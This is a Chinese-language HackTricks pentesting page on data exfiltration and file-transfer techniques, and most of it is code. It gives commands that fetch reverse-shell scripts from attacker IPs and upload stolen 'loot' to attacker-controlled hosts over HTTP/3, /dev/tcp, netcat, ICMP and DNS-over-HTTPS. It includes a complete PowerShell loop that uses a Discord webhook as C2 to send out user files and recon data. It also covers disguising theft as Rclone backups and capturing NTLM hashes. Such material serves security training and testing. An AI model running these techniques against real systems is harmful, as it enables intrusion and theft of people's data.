# Exfiltration

{{#include ../banners/hacktricks-training.md}}

> [!TIP]
> 如需了解如何在 `C:\Users\Public` 中暂存 loot，并使用 Rclone 模拟合法备份来进行 exfiltration，请参阅下面的工作流程。

{{#ref}}
../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
{{#endref}}

## 常见的用于 exfiltrate 信息的白名单域名

访问 [https://lots-project.com/](https://lots-project.com/)，查找可被滥用的常见白名单域名

## Copy\&Paste Base64

**Linux**
```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```
**Windows**
```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```
## HTTP

**Linux**
```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```
**Windows**
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
### 上传文件

- [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
- [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
- Python 模块 [uploadserver](https://pypi.org/project/uploadserver/):
```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth:
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt'
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```
### **HTTPS 服务器**
```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)
@app.route('/')
def root():
print(request.get_json())
return "OK"
if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```
### HTTP/3 / QUIC

如果出站控制针对经典的 **TCP/443** 检查进行了调优，但对 **UDP/443** 较为宽松，强制使用 **HTTP/3** 可以将传输切换为 **QUIC**，而不是基于 TCP 的 TLS。攻击者端点需要原生支持 HTTP/3（例如已经通过 `Alt-Svc: h3` 宣告支持的 reverse proxy 或 upload endpoint）。
```bash
# Strict: fail if QUIC/H3 is not available
curl --http3-only -T loot.7z https://attacker-h3.example/upload

# Opportunistic: prefer H3, but fall back to h2/h1 if QUIC fails
curl --http3 -T loot.7z https://attacker-h3.example/upload

# Learn the server's Alt-Svc advertisement and reuse it
curl --alt-svc /tmp/altsvc.cache https://attacker-h3.example/
curl --alt-svc /tmp/altsvc.cache -T loot.7z https://attacker-h3.example/upload
```
一篇 2025 年的研究论文（QUIC-Exfil）表明，QUIC 的加密 headers 和 connection migration 等特性，可能使防火墙级别的 exfiltration 检测比经典 TLS 或基于 DNS 的通道更困难，因此随着 HTTP/3 支持的普及，预计这一领域会变得更加重要。

### 预签名 / 委托的对象存储上传

当你可以生成或获取一个短期有效的 **signed URL** 时，受害主机只需要一个普通的 HTTPS client。这避免了在主机上安装 cloud SDK 或保存长期有效的凭据，同时也能融入常见的对象存储流量。

**Linux / macOS（AWS S3 预签名 `PUT`）**
```bash
curl -X PUT -T loot.7z \
-H 'Content-Type: application/octet-stream' \
'https://bucket.s3.amazonaws.com/case123/loot.7z?<presigned-query>'
```
**Windows PowerShell (AWS S3 pre-signed `PUT`)**
```powershell
Invoke-WebRequest -Method Put -InFile .\loot.7z `
-ContentType 'application/octet-stream' `
-Uri $presignedUrl
```
**Azure Blob SAS URL**
```bash
curl -X PUT --data-binary @loot.7z \
-H 'x-ms-blob-type: BlockBlob' \
-H 'Content-Type: application/octet-stream' \
'https://acct.blob.core.windows.net/container/loot.7z?<sas>'
```
备注：
- Pre-signed URLs / SAS tokens 通常限定 **path**、**HTTP method** 和 **expiration**。
- 对于 Azure Blob `Put Blob`，`x-ms-blob-type: BlockBlob` 是必需的。
- 此模式非常适用于 `curl`、`Invoke-WebRequest`，或任何能够发起原始 HTTPS `PUT` 请求的自定义 implant。

### goshs

[goshs](https://github.com/patrickhener/goshs) 是 `python3 -m http.server` 的单二进制替代方案，
支持 upload、download、WebDAV、SFTP、SMB、TLS、authentication、share links，
以及 OOB collaboration 功能（DNS、SMTP、NTLM hash capture）。
```bash
# Serve current directory on port 8000
goshs

# Serve with HTTPS (self-signed)
goshs -s -ss

# Serve with basic auth
goshs -b user:password

# Upload-only mode
goshs -uo

# Read-only mode
goshs -ro

# Capture SMB NTLM hashes
goshs -smb -smb-domain CORP

# DNS callback server
goshs -dns -dns-ip 10.10.10.10

# SMTP callback server
goshs -smtp -smtp-domain [REDACTED]

# Tunnel via localhost.run (no port forwarding needed)
goshs -tunnel
```
## Webhooks（Discord/Slack/Teams）用于 C2 和 Data Exfiltration

Webhooks 是仅写入的 HTTPS endpoints，可接受 JSON 和可选的文件 parts。它们通常被允许访问受信任的 SaaS domains，且不需要 OAuth/API keys，因此适合用于低摩擦的 beaconing 和 exfiltration。

关键思路：
- Endpoint：Discord 使用 https://discord.com/api/webhooks/<id>/<token>
- 使用 `POST multipart/form-data`，其中包含名为 `payload_json` 的 part，其内容为 `{"content":"..."}`，以及可选的、名为 `file` 的文件 part。
- Operator loop 模式：定期 beacon -> directory recon -> targeted file exfil -> recon dump -> sleep。HTTP 204 NoContent/200 OK 表示交付成功。

PowerShell PoC（Discord）：
```powershell
# 1) Configure webhook and optional target file
$webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
$target  = Join-Path $env:USERPROFILE "Documents\SENSITIVE_FILE.bin"

# 2) Reuse a single HttpClient
$client = [System.Net.Http.HttpClient]::new()

function Send-DiscordText {
param([string]$Text)
$payload = @{ content = $Text } | ConvertTo-Json -Compress
$jsonContent = New-Object System.Net.Http.StringContent($payload, [System.Text.Encoding]::UTF8, "application/json")
$mp = New-Object System.Net.Http.MultipartFormDataContent
$mp.Add($jsonContent, "payload_json")
$resp = $client.PostAsync($webhook, $mp).Result
Write-Host "[Discord] text -> $($resp.StatusCode)"
}

function Send-DiscordFile {
param([string]$Path, [string]$Name)
if (-not (Test-Path $Path)) { return }
$bytes = [System.IO.File]::ReadAllBytes($Path)
$fileContent = New-Object System.Net.Http.ByteArrayContent(,$bytes)
$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
$json = @{ content = ":package: file exfil: $Name" } | ConvertTo-Json -Compress
$jsonContent = New-Object System.Net.Http.StringContent($json, [System.Text.Encoding]::UTF8, "application/json")
$mp = New-Object System.Net.Http.MultipartFormDataContent
$mp.Add($jsonContent, "payload_json")
$mp.Add($fileContent, "file", $Name)
$resp = $client.PostAsync($webhook, $mp).Result
Write-Host "[Discord] file $Name -> $($resp.StatusCode)"
}

# 3) Beacon/recon/exfil loop
$ctr = 0
while ($true) {
$ctr++
# Beacon
$beacon = "━━━━━━━━━━━━━━━━━━`n:satellite: Beacon`n```User: $env:USERNAME`nHost: $env:COMPUTERNAME```"
Send-DiscordText -Text $beacon

# Every 2nd: quick folder listing
if ($ctr % 2 -eq 0) {
$dirs = @("Documents","Desktop","Downloads","Pictures")
$acc = foreach ($d in $dirs) {
$p = Join-Path $env:USERPROFILE $d
$items = Get-ChildItem -Path $p -ErrorAction SilentlyContinue | Select-Object -First 3 -ExpandProperty Name
if ($items) { "`n$d:`n - " + ($items -join "`n - ") }
}
Send-DiscordText -Text (":file_folder: **User Dirs**`n━━━━━━━━━━━━━━━━━━`n```" + ($acc -join "") + "```")
}

# Every 3rd: targeted exfil
if ($ctr % 3 -eq 0) { Send-DiscordFile -Path $target -Name ([IO.Path]::GetFileName($target)) }

# Every 4th: basic recon
if ($ctr % 4 -eq 0) {
$who = whoami
$ip  = ipconfig | Out-String
$tmp = Join-Path $env:TEMP "recon.txt"
"whoami:: $who`r`nIPConfig::`r`n$ip" | Out-File -FilePath $tmp -Encoding utf8
Send-DiscordFile -Path $tmp -Name "recon.txt"
}

Start-Sleep -Seconds 20
}
```
Notes:
- 类似模式也适用于其他 collaboration platforms（Slack/Teams），它们使用 incoming webhooks；请相应调整 URL 和 JSON schema。
- 关于 Discord Desktop cache artifacts 以及 webhook/API recovery 的 DFIR，请参阅：

{{#ref}}
../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
{{#endref}}

## Rclone（cloud/object-storage exfiltration）

现代攻击者通常会先在本地 **stage loot**，然后使用 [Rclone](https://rclone.org/) 让传输看起来像正常的 backup 或 sync job。一个实用模式是：

1. 一个普通 remote（`s3`、`webdav`、`drive`、`mega`，...）
2. 一个 `crypt` wrapper，使 **contents 和 filenames 在 client-side 加密**
3. 如果 provider 强制执行 object-size limits，或者你希望使用更小的 upload units，可选用 `chunker` wrapper
```bash
# 1) Create the storage backend remote (interactive)
rclone config              # ex: remote

# 2) Wrap it with client-side encryption
rclone config              # ex: secret -> remote:path

# 3) Optional: create a chunker overlay for large objects
rclone config              # ex: overlay -> secret:

# 4) Upload staged data
rclone copy /loot secret:$(hostname)-$(date +%F) \
--transfers 2 --checkers 2 --bwlimit 4M
# If you created the chunker wrapper, upload to overlay:... instead
```
注意：
- `crypt` 可以加密文件内容和文件名。
- `chunker` 会透明地拆分大文件，并在下载时重新组装。
- `rclone.conf` 以 **obscured** 形式存储 `crypt` secrets，并不能提供强大的静态数据保护。对于短期操作，优先使用专用的临时配置，并在之后将其删除。如果必须保留更长时间，优先使用加密的配置处理方式（`RCLONE_CONFIG_PASS` / `--password-command`），而不是将未加密的 `rclone.conf` 留在磁盘上。
- 如果目标系统已经同步 **OneDrive**、**Google Drive** 或 **Dropbox**，可以将 loot 复制到同步目录中，借助已获批准的客户端传输，而不是再放置一个新的传输 binary。

{{#ref}}
../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/local-cloud-storage.md
{{#endref}}

## FTP

### FTP server (python)
```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```
### FTP server (NodeJS)
```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```
### FTP 服务器 (pure-ftp)
```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```
### **Windows** 客户端
```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```
## SMB

Kali 作为 server
```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```
或者使用 **samba** 创建一个 smb 共享：
```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
comment = Samba on Ubuntu
path = /tmp/smb
read only = no
browsable = yes
guest ok = Yes
#Start samba
service smbd restart
```
Windows
```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```
### goshs
[goshs](https://github.com/patrickhener/goshs) 是一种单二进制替代方案，可通过 SMB 提供文件服务，并捕获连接客户端的 NetNTLMv2 hashes：
```bash
# Start SMB server with NTLM hash capture
goshs -smb -smb-domain CORP

# Also works for plain HTTP file serving
goshs
```
## SCP

攻击者必须运行 SSHd。
```bash
scp <username>@<Attacker_IP>:<directory>/<filename>
```
## SSHFS

如果受害者启用了 SSH，攻击者可以将受害者上的目录挂载到攻击者一侧。
```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```
## NC
```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```
## /dev/tcp

### 从受害者下载文件
```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```
### 将文件上传到受害者
```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```
感谢 **@BinaryShadow\_**

## **ICMP**
```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
if pkt.haslayer(ICMP):
if pkt[ICMP].type == 0:
data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```
## DNS over HTTPS (DoH)

如果 classic UDP/53 DNS 流量过于明显或被阻断，但出站 HTTPS 通常被允许，则可以将常见的 DNS-label exfiltration 模式封装在发往 public resolver 的 **DoH** 请求中。让每个 label 都远低于 63-byte DNS limit，并使用 Base32 等 DNS-safe alphabet。
```bash
# Encode -> split into DNS-safe labels -> send via DoH
base32 -w0 /tmp/loot.bin | tr -d '=' | tr 'A-Z' 'a-z' | fold -w32 | \
nl -nrz -w4 -s. | while read chunk; do
curl --http2 -s \
-H 'accept: application/dns-json' \
"https://dns.google/resolve?name=${chunk}.exf.attacker.tld&type=TXT" \
>/dev/null
done
```
在 `exf.attacker.tld` 的权威 DNS server 上，按数字前缀对 queries 进行排序，并重构 Base32 stream。这样可以让传输通过 HTTPS 进入 resolver，而不是使用经典的 UDP/53 DNS。

如需完整的双向 DNS tunnel 工具（`iodine`、`dnscat2` 等），请查看 [tunneling page](tunneling-and-port-forwarding.md)。

## **SMTP**

如果你可以向 SMTP server 发送数据，就可以使用 python 创建一个 SMTP 来接收数据：
```bash
sudo python -m smtpd -n -c DebuggingServer :25
```
### goshs

[goshs](https://github.com/patrickhener/goshs) 可以快速启动 SMTP server，
用于在 OOB exfiltration 场景中捕获 email callbacks：
```bash
# Start SMTP callback server
goshs -smtp -smtp-domain [REDACTED]
```
收到的 emails 和 callbacks 会直接显示在终端输出中。  
可与 DNS callback server 结合使用，以实现完整的 OOB 覆盖：
```bash
# DNS + SMTP combined
goshs -dns -dns-ip 10.10.10.10 -smtp -smtp-domain [REDACTED]
```
## TFTP

默认情况下，在 XP 和 2003 中启用（在其他系统中需要在安装期间显式添加）

在 Kali 中，**启动 TFTP server**：
```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```
**python 中的 TFTP 服务器：**
```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```
在 **victim** 中，连接到 Kali server：
```bash
tftp -i <KALI-IP> get nc.exe
```
## PHP

使用 PHP one-liner 下载文件：
```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```
## VBScript
```bash
Attacker> python -m SimpleHTTPServer 80
```
**受害者**
```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```
## Debug.exe

`debug.exe` 程序不仅允许检查二进制文件，还具备**根据十六进制重建二进制文件的能力**。这意味着，只需提供二进制文件的十六进制内容，`debug.exe` 就能生成该二进制文件。不过，需要注意的是，debug.exe **只能汇编大小不超过 64 KB 的文件**。
```bash
# Reduce the size
upx -9 nc.exe
wine exe2bat.exe nc.exe nc.txt
```
然后将文本复制粘贴到 windows-shell 中，随后会创建一个名为 nc.exe 的文件。

## References

- [将文件传输到 Windows](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
- [Google Public DNS - DNS-over-HTTPS (DoH)](https://developers.google.com/speed/public-dns/docs/doh)
- [Rclone `crypt` backend](https://rclone.org/crypt/)
- [goshs](https://github.com/patrickhener/goshs)
- [将 Discord 用作 C2 以及遗留在其后的缓存证据](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
- [Discord Webhooks – 执行 Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
- [Discord Forensic Suite（缓存解析器）](https://github.com/jwdfir/discord_cache_parser)
- [使用预签名 URL 上传对象 - Amazon S3](https://docs.aws.amazon.com/AmazonS3/latest/userguide/PresignedUrlUploadObject.html)
- [QUIC-Exfil：利用 QUIC 的 Server Preferred Address 功能执行数据外传攻击](https://arxiv.org/abs/2505.05292)

{{#include ../banners/hacktricks-training.md}}
